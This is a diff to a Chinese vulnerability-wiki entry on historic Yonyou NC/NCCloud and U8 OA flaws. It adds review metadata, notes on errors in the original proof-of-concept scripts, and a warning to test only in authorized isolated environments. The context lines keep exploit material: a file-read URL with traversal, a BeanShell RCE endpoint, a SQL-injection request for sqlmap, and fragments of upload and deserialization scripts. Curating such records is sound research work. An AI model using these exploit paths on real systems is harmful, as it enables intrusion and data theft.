@@ -1,12 +1,52 @@
 ---
-version: "/uapws/service"
-fofa: "/platform/yonyou-yyy.js"
 source: "MrWQ/vulnerability-paper"
+title: "用友NC/NCCloud及U8 OA 历史多漏洞/组件接口集合"
+product: "用友NC/NCCloud及U8 OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "各节不同；部分NC6.5，多数未知"
+prerequisites: "混合暴露服务和登录入口"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://github.com/j2ekim/YonyouNC_Tip"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/YonyouNC%20Tip.md"
+fofa_unverified: "/platform/yonyou-yyy.js"
+id: "vw-a0b0c49b9568f6ded3b839ad"
+entity_id: "ve-a0b0c49b9568f6ded3b839ad"
+schema_version: "1"
 ---
 
-# YonyouNC Tip
+# 用友NC/NCCloud及U8 OA 历史多漏洞/组件接口集合
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友NC/NCCloud及U8 OA；历史多漏洞/组件接口集合
+- 版本、配置及部署条件：各节不同；部分NC6.5，多数未知
+- 认证与权限前提：混合暴露服务和登录入口
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- version误取/uapws/service；多产品不能整体归NC单实体
+- FileReceive脚本multithreading参数file却open(filename)未定义，纯文本标记写jsp不足称Getshell
+- Xbrl脚本URL拼接语法错误、DNS长度字段硬编码且改域未更新；URLDNS仅证反序列化不证命令执行
+- 控制台改返回0为1仅客户端界面变化，必须服务端权限验证；XXE节只有WSDL无实体请求
+- 配置含示例加密密码需占位；BeanShell多模块路由是部署变体非几十独立漏洞
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [github.com](https://github.com/j2ekim/YonyouNC_Tip)
 
 [](#0x00-前言)0x00 前言
@@ -26,7 +66,7 @@ source: "MrWQ/vulnerability-paper"
 [](#0x02-配置文件)0x02 配置文件
 -----------------------
 
-### [](#21-webxml)2.1 WEB.xml
+#### [](#21-webxml)2.1 WEB.xml
 
 ```
 /webapps/nc_web/WEB-INF/web.xml 
@@ -44,7 +84,7 @@ source: "MrWQ/vulnerability-paper"
 	</servlet-mapping>
 ```
 
-### [](#22-propxml数据库配置)2.2 prop.xml(数据库配置)
+#### [](#22-propxml数据库配置)2.2 prop.xml(数据库配置)
 
 ```
 /ierp/bin/prop.xml 
@@ -72,7 +112,7 @@ source: "MrWQ/vulnerability-paper"
 [](#0x03-漏洞整理)0x03 漏洞整理
 -----------------------
 
-### [](#31-任意文件读取)3.1 任意文件读取
+#### [](#31-任意文件读取)3.1 任意文件读取
 
 `filename`参数可以读取下列所有文件，在某些情况下可以读取利用目录穿越可读取/etc/passwd等文件
 
@@ -82,7 +122,7 @@ http://x.x.x.x/NCFindWeb?service=IPreAlertConfigService&filename=/
 
 [![image-20220420110517903](https://camo.githubusercontent.com/c1b4cab1c865469d72449f5b092c8ba1e4fd789ee273fa566a8da303387200a9/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303131303531373930332e706e67)](https://camo.githubusercontent.com/c1b4cab1c865469d72449f5b092c8ba1e4fd789ee273fa566a8da303387200a9/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303131303531373930332e706e67)
 
-### [](#32-bshservletbshservlet-远程命令执行漏洞)3.2 `bsh.servlet.BshServlet` 远程命令执行漏洞
+#### [](#32-bshservletbshservlet-远程命令执行漏洞)3.2 `bsh.servlet.BshServlet` 远程命令执行漏洞
 
 用友 `NC bsh.servlet.BshServlet` 存在远程命令执行漏洞，通过 `BeanShell` 执行远程命令获取服务器权限。
 
@@ -149,7 +189,7 @@ http://x.x.x.x/service/~yer/bsh.servlet.BshServlet
 
 [![image-20220420113613160](https://camo.githubusercontent.com/749ff1e9ed689becc35b0e21ee0d71b6b2334d927163b99267a9bc0571a9ba10/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303131333631333136302e706e67)](https://camo.githubusercontent.com/749ff1e9ed689becc35b0e21ee0d71b6b2334d927163b99267a9bc0571a9ba10/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303131333631333136302e706e67)
 
-### [](#33-用友-nccloud-fs-文件管理-sql-注入)3.3 用友 `NCCloud FS` 文件管理 `SQL` 注入
+#### [](#33-用友-nccloud-fs-文件管理-sql-注入)3.3 用友 `NCCloud FS` 文件管理 `SQL` 注入
 
 用友 `NCCloud FS` 文件管理登录页面对用户名参数没有过滤，存在 `SQL` 注入。
 
@@ -173,7 +213,7 @@ http://x.x.x.x/fs/
 
 `username`参数存在注入，抓取登录数据包：
 
-```
+```http
 GET /fs/console?username=1&password=00PGRLxSTe3VroI21qJNymCrZfPX1UQ4ij0gIWn2Gc4%3D HTTP/1.1
 Host: x.x.x.x
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
@@ -182,7 +222,7 @@ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
 Referer: http://x.x.x.x/fs/
-Cookie: JSESSIONID=FFAE8EF48BD3BEF7E94B5449B8F9BA90.server
+Cookie: JSESSIONID=F*************************************r
 Upgrade-Insecure-Requests: 1	
 ```
 
@@ -194,7 +234,7 @@ sqlmap -r text.txt -p username
 
 [![image-20220420130305834](https://camo.githubusercontent.com/813d08ffccaebe1445408f86901e9702174b80d491d88406f27db184d25a7915/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133303330353833342e706e67)](https://camo.githubusercontent.com/813d08ffccaebe1445408f86901e9702174b80d491d88406f27db184d25a7915/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133303330353833342e706e67)
 
-### [](#34-用友-nc-65-未授权文件上传漏洞)3.4 用友 `NC 6.5` 未授权文件上传漏洞
+#### [](#34-用友-nc-65-未授权文件上传漏洞)3.4 用友 `NC 6.5` 未授权文件上传漏洞
 
 用友 `NC6.5` 版本存在未授权文件上传漏洞，攻击者可以未授权上传任意文件，进而获取服务端控制权限。
 
@@ -280,7 +320,7 @@ if __name__ == "__main__":
 
 [用友NC-OA漏洞合集](https://github.com/asdasdqkq1/yonyou-nc-exp)
 
-### [](#35-用友-nc-xbrlpersistenceservlet-反序列化)3.5 用友 `NC XbrlPersistenceServlet` 反序列化
+#### [](#35-用友-nc-xbrlpersistenceservlet-反序列化)3.5 用友 `NC XbrlPersistenceServlet` 反序列化
 
 已知用友 `NC6.5` 版本存在反序列化漏洞，攻击者可以执行系统命令，获取服务端权限。
 
@@ -306,7 +346,7 @@ req = requests.post("http://+"ip"+/service/~xbrl/XbrlPersistenceServlet", header
 print (req.text)
 ```
 
-### [](#36-用友-u8-oa-sql注入漏洞)3.6 用友 `U8 OA` `SQL`注入漏洞
+#### [](#36-用友-u8-oa-sql注入漏洞)3.6 用友 `U8 OA` `SQL`注入漏洞
 
 用友 `U8 OA test.jsp` 文件存在 `SQL` 注入漏洞
 
@@ -328,7 +368,7 @@ POC:
 
 [![image-20220420134720251](https://camo.githubusercontent.com/ab13aa6e9552caaa0949c8b7e061e22e48b3c6ba4d5171d0e11c96276d01146e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133343732303235312e706e67)](https://camo.githubusercontent.com/ab13aa6e9552caaa0949c8b7e061e22e48b3c6ba4d5171d0e11c96276d01146e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133343732303235312e706e67)
 
-### [](#37-xxe漏洞)3.7 xxe漏洞
+#### [](#37-xxe漏洞)3.7 xxe漏洞
 
 接口处的XXE漏洞
 
@@ -340,7 +380,7 @@ POC:
 
 [![image-20220420135051396](https://camo.githubusercontent.com/a207940aeb0f8787cb9ec27f75f70b4593ce2bfde957580d123904ed8a8f557d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133353035313339362e706e67)](https://camo.githubusercontent.com/a207940aeb0f8787cb9ec27f75f70b4593ce2bfde957580d123904ed8a8f557d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133353035313339362e706e67)
 
-### [](#38-接口信息泄露)3.8 接口信息泄露
+#### [](#38-接口信息泄露)3.8 接口信息泄露
 
 在其中有个接口可以获取数据库账户密码，不过是老版本了
 
@@ -350,7 +390,7 @@ POC:
 
 [![image-20220420135719084](https://camo.githubusercontent.com/9c974231dcda49b7c2fd3ea604a63bf79ba168f0aaf82671ecc42df94ff4cada/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133353731393038342e706e67)](https://camo.githubusercontent.com/9c974231dcda49b7c2fd3ea604a63bf79ba168f0aaf82671ecc42df94ff4cada/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6a32656b696d2f626c6f672d696d6167652f696d6167652f696d6167652d32303232303432303133353731393038342e706e67)
 
-### [](#39-控制台密码绕过)3.9 控制台密码绕过
+#### [](#39-控制台密码绕过)3.9 控制台密码绕过
 
 ```
 /uapws/index.jsp 
